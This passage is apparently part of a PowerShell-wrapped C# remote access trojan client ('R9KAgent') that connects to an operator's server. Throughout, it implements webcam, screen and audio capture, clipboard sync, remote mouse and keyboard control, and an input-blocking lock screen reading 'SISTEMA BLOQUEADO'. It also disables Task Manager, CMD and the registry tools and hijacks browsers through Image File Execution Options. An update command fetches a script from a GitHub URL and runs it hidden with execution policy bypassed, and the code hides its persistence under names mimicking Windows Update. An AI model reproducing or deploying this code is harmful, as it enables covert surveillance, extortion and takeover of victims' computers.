                        IntPtr p = GlobalLock(h);
                        if (p == IntPtr.Zero) return "";
                        try { return Marshal.PtrToStringUni(p); }
                        finally { GlobalUnlock(h); }
                    } finally { CloseClipboard(); }
                }
                Thread.Sleep(50);
            }
            return null;
        }

        static bool SetClipboardText(string text) {
            for (int i = 0; i < 5; i++) {
                if (OpenClipboard(IntPtr.Zero)) {
                    try {
                        if (!EmptyClipboard()) return false;
                        int bytes = (text.Length + 1) * 2;
                        IntPtr h = GlobalAlloc(GMEM_MOVEABLE, (UIntPtr)bytes);
                        if (h == IntPtr.Zero) return false;
                        IntPtr p = GlobalLock(h);
                        if (p == IntPtr.Zero) { GlobalFree(h); return false; }
                        byte[] buf = Encoding.Unicode.GetBytes(text + "\0");
                        Marshal.Copy(buf, 0, p, buf.Length);
                        GlobalUnlock(h);
                        if (SetClipboardData(CF_UNICODETEXT, h) == IntPtr.Zero) { GlobalFree(h); return false; }
                        return true;
                    } finally { CloseClipboard(); }
                }
                Thread.Sleep(50);
            }
            return false;
        }

        static void ProcessCommand(string cmd, StreamWriter myWriter) {
            try {
                if (cmd == "pong") { lastPongTime = DateTime.UtcNow; return; }
                if (cmd == "stream_start") { streaming = true; return; }
                if (cmd == "stream_stop") { streaming = false; cursorOverride = false; lock (writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                if (cmd == "cursor_free") { cursorOverride = false; return; }
                if (cmd == "audio_start") { StartAudio(); lock (writeLock) { myWriter.WriteLine("AUDIO_ON"); } return; }
                if (cmd == "audio_stop") { isAudioRunning = false; lock (writeLock) { myWriter.WriteLine("AUDIO_OFF"); } return; }
                if (cmd == "webcam") {
                    string b64 = CaptureWebcam();
                    lock (writeLock) {
                        if (b64 != null) myWriter.WriteLine("WEBCAM:" + b64);
                        else myWriter.WriteLine("CAM_ERR:no_camera");
                    }
                    return;
                }
                if (cmd == "monitor_next") {
                    int n = Screen.AllScreens.Length;
                    if (n > 1) { currentScreen = (currentScreen + 1) % n; lock (writeLock) { myWriter.WriteLine("MONITOR:" + currentScreen + "/" + n); } }
                    else { lock (writeLock) { myWriter.WriteLine("MONITOR:1/1"); } }
                    return;
                }
                if (cmd.StartsWith("clip_sync ")) {
                    try {
                        string b64 = cmd.Substring(10);
                        string txt = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
                        bool changed = false;
                        lock (clipLock) { if (txt != lastClipboardText) { lastClipboardText = txt; changed = true; } }
                        if (changed) SetClipboardText(txt);
                    } catch {}
                    return;
                }
                if (cmd == "reboot")   { lock (writeLock) { myWriter.WriteLine("REBOOTING"); } Thread.Sleep(200); Process.Start("shutdown", "/r /f /t 0"); return; }
                if (cmd == "shutdown") { lock (writeLock) { myWriter.WriteLine("SHUTTING_DOWN"); } Thread.Sleep(200); Process.Start("shutdown", "/s /f /t 0"); return; }
                if (cmd == "logoff")   { lock (writeLock) { myWriter.WriteLine("LOGGING_OFF"); } Thread.Sleep(200); Process.Start("shutdown", "/l /f"); return; }
                if (cmd == "reinstall" || cmd == "update") {
                    try {
                        string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
                        if (Directory.Exists(dir)) {
                            foreach (string sub in Directory.GetDirectories(dir)) {
                                string leaf = Path.GetFileName(sub);
                                if (leaf.Length != 8) continue;
                                string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
                                string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                                try { if (File.Exists(scriptPath)) File.SetAttributes(scriptPath, FileAttributes.Normal); } catch {}
                                try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); } } catch {}
                                try { File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
                                try {
                                    var psi = new ProcessStartInfo("powershell.exe",
                                        "-nop -w hidden -ep bypass -f \"" + scriptPath + "\" -silent") { UseShellExecute = false, CreateNoWindow = true };
                                    Process.Start(psi);
                                } catch {}
                            }
                        }
                    } catch {}
                    Thread.Sleep(500);
                    Environment.Exit(0);
                    return;
                }
                if (cmd == "banner_on") {
                    if (bannerThread != null && bannerThread.IsAlive) return;
                    BlockInput(true);
                    bannerThread = new Thread(() => {
                        try {
                            Image bgImg = null;
                            try {
                                using (var wc = new WebClient()) {
                                    wc.Headers.Add("User-Agent", "Mozilla/5.0");
                                    byte[] imgBytes = wc.DownloadData("https://i.imgur.com/7PjKabp.jpeg?v=1");
                                    using (MemoryStream ms = new MemoryStream(imgBytes)) { bgImg = Image.FromStream(ms); }
                                }
                            } catch {}
                            Form f = new Form();
                            f.FormBorderStyle = FormBorderStyle.None; f.WindowState = FormWindowState.Maximized;
                            f.TopMost = true; f.ShowInTaskbar = false; f.BackColor = Color.Black;
                            if (bgImg != null) { f.BackgroundImage = bgImg; f.BackgroundImageLayout = ImageLayout.Stretch; }
                            else f.Controls.Add(new Label { Text = "SISTEMA BLOQUEADO", ForeColor = Color.Red, Font = new Font("Arial", 48), Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter });
                            f.KeyPreview = true; f.KeyDown += (s, e) => { e.SuppressKeyPress = true; };
                            bannerForm = f; Application.Run(f);
                        } catch {}
                    });
                    bannerThread.SetApartmentState(ApartmentState.STA); bannerThread.IsBackground = true; bannerThread.Start();
                    lock (writeLock) { myWriter.WriteLine("BANNER_ON"); }
                    return;
                }
                if (cmd == "banner_off") {
                    BlockInput(false);
                    Form f = bannerForm;
                    if (f != null) { try { f.BeginInvoke(new Action(() => f.Close())); } catch {} bannerForm = null; }
                    Thread bt = bannerThread;
                    if (bt != null) { try { bt.Join(2000); } catch {} bannerThread = null; }
                    lock (writeLock) { myWriter.WriteLine("BANNER_OFF"); }
                    return;
                }
                if (cmd == "uninstall") {
                    BlockInput(false); UnblockAllApps();
                    try {
                        string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
                        foreach (string sub in Directory.GetDirectories(dir)) {
                            string leaf = Path.GetFileName(sub);
                            if (leaf.Length != 8) continue;
                            string runName = "WinUpdateSvc_" + leaf;
                            try { using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue(runName, false); } } catch {}
                            try { using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue(runName, false); } } catch {}
                            try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService_" + leaf + " /f").WaitForExit(); } catch {}
                            try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateBoot_" + leaf + " /f").WaitForExit(); } catch {}
                            try { Process.Start("schtasks", "/delete /tn \"\\Microsoft\\Windows\\Application Experience\\MicrosoftCompatibilityAppraiser_" + leaf + "\" /f").WaitForExit(); } catch {}
                            string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                            string sv = Path.Combine(startup, runName + ".vbs");
                            if (File.Exists(sv)) { try { File.SetAttributes(sv, FileAttributes.Normal); File.Delete(sv); } catch {} }
                            foreach (var f in Directory.GetFiles(sub)) { try { File.SetAttributes(f, FileAttributes.Normal); File.Delete(f); } catch {} }
                        }
                    } catch {}
                    Environment.Exit(0);
                }
                if (cmd == "block_apps") { BlockAllApps(); lock (writeLock) { myWriter.WriteLine("APPS_BLOQUEADOS"); } return; }
                if (cmd == "unblock_apps") { UnblockAllApps(); lock (writeLock) { myWriter.WriteLine("APPS_DESBLOQUEADOS"); } return; }
                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock (writeLock) { myWriter.WriteLine("MOUSE_TRAVADO"); } return; }
                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock (writeLock) { myWriter.WriteLine("MOUSE_SOLTO"); } return; }
                if (cmd == "screenshot") { string s = CaptureScreen(1920, 90); if (s != null) { lock (writeLock) { myWriter.WriteLine("SCREEN:" + s); } } return; }
                if (cmd == "ping") { lock (writeLock) { myWriter.WriteLine("PONG"); } return; }
                if (cmd.StartsWith("move ")) {
                    string[] p = cmd.Split(' ');
                    int nx = int.Parse(p[1]); int ny = int.Parse(p[2]);
                    var b = Screen.AllScreens[currentScreen].Bounds;
                    targetX = b.X + (int)((nx / 65535.0) * b.Width);
                    targetY = b.Y + (int)((ny / 65535.0) * b.Height);
                    hasNewPos = true;
                    cursorOverride = true;
                }
                else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
                else if (cmd == "md 2") mouse_event(0x0008, 0, 0, 0, 0);
                else if (cmd == "mu 2") mouse_event(0x0010, 0, 0, 0, 0);
                else if (cmd == "md 3") mouse_event(0x0020, 0, 0, 0, 0);
                else if (cmd == "mu 3") mouse_event(0x0040, 0, 0, 0, 0);
                else if (cmd.StartsWith("mw ")) mouse_event(0x0800, 0, 0, (uint)int.Parse(cmd.Substring(3)), 0);
                else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
            } catch {}
        }

        static void BlockAllApps() {
            try { Process.Start("taskkill", "/F /IM explorer.exe").WaitForExit(); } catch {}
            string[] browsers = { "chrome", "msedge", "firefox", "opera", "brave" };
            foreach (var b in browsers) { try { Process.Start("taskkill", "/F /IM " + b + ".exe").WaitForExit(); } catch {} }
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")) {
                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
                key.SetValue("NoRun", 1, RegistryValueKind.DWord);
                key.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System")) {
                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System")) {
                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            }
            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System")) {
                key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            }
            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
            foreach (var app in apps) {
                try { using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app)) { key.SetValue("Debugger", "svchost.exe"); } } catch {}
            }
        }

        static void UnblockAllApps() {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", true)) {
                if (key != null) { key.DeleteValue("NoViewOnDrive", false); key.DeleteValue("NoRun", false); key.DeleteValue("NoDesktop", false); }
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true)) {
                if (key != null) { key.DeleteValue("DisableTaskMgr", false); key.DeleteValue("DisableRegistryTools", false); }
            }
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Policies\Microsoft\Windows\System", true)) {
                if (key != null) key.DeleteValue("DisableCMD", false);
            }
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true)) {
                if (key != null) key.DeleteValue("DisableCMD", false);
            }
            string[] apps = { "chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe", "notepad.exe", "wordpad.exe", "calc.exe", "mspaint.exe", "explorer.exe" };
            foreach (var app in apps) {
                try { Registry.LocalMachine.DeleteSubKeyTree(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + app, false); } catch {}
            }
            try { Process.Start("explorer.exe"); } catch {}
        }

        static string CaptureScreen(int maxW, long quality) {
            lock (capLock) {
                try {
                    Rectangle bounds = Screen.AllScreens[currentScreen].Bounds;
                    if (reuseBmp == null || reuseBmp.Width != bounds.Width || reuseBmp.Height != bounds.Height) {
                        if (reuseGfx != null) reuseGfx.Dispose();
                        if (reuseBmp != null) reuseBmp.Dispose();
                        reuseBmp = new Bitmap(bounds.Width, bounds.Height);
                        reuseGfx = Graphics.FromImage(reuseBmp);
                    }
                    reuseGfx.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);

                    Bitmap finalBmp = reuseBmp;
                    float scale = 1.0f;
                    if (maxW > 0 && reuseBmp.Width > maxW) {
                        int newW = maxW;
                        int newH = (int)(reuseBmp.Height * ((float)maxW / reuseBmp.Width));
                        finalBmp = new Bitmap(newW, newH);
                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                            g2.DrawImage(reuseBmp, 0, 0, newW, newH);
                        }
                        scale = (float)newW / reuseBmp.Width;
                    }

                    if (!cursorOverride) {
                        CURSORINFO ci = new CURSORINFO();
                        ci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
                        if (GetCursorInfo(ref ci) && (ci.flags & CURSOR_SHOWING) != 0 && ci.hCursor != IntPtr.Zero) {
                            int sx = ci.ptScreenPos.X - bounds.X;
                            int sy = ci.ptScreenPos.Y - bounds.Y;
                            if (sx >= 0 && sy >= 0 && sx < reuseBmp.Width && sy < reuseBmp.Height) {
                                int dx = (int)(sx * scale);
                                int dy = (int)(sy * scale);
                                using (Graphics g3 = Graphics.FromImage(finalBmp)) {
                                    IntPtr hdc = g3.GetHdc();
                                    DrawIconEx(hdc, dx, dy, ci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
                                    g3.ReleaseHdc(hdc);
                                }
                            }
                        }
                    }

                    using (MemoryStream ms = new MemoryStream()) {
                        EnsureJpegCodec(quality);
                        finalBmp.Save(ms, jpgCodec, jpgParams);
                        if (finalBmp != reuseBmp) finalBmp.Dispose();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                } catch { return null; }
            }
        }
    }
"@
}

[R9KAgent]::Start($serverIP, $serverPort)
